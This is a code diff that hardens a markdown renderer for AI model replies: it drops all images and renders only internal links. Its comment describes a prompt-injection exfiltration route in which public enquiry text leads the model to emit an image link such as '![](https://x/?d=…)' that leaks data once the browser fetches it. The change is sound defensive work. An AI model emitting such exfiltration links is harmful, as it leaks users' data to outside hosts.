@@ -9,8 +9,16 @@ import remarkGfm from "remark-gfm";
  * clickable internal Next.js links — anything else (external URLs, mailto:,
  * javascript:) renders as plain text, so a model can never inject a navigable
  * off-app or unsafe link. Raw HTML is not rendered (react-markdown default).
+ *
+ * Images are never rendered: an injected `![](https://x/?d=…)` would make the
+ * browser fetch that URL the moment the reply appears, leaking whatever the
+ * model put in it — and website enquiries put text typed by the public in
+ * front of the model.
  */
 const COMPONENTS: Components = {
+  img() {
+    return null;
+  },
   a({ href, children }) {
     if (typeof href === "string" && href.startsWith("/")) {
       return (
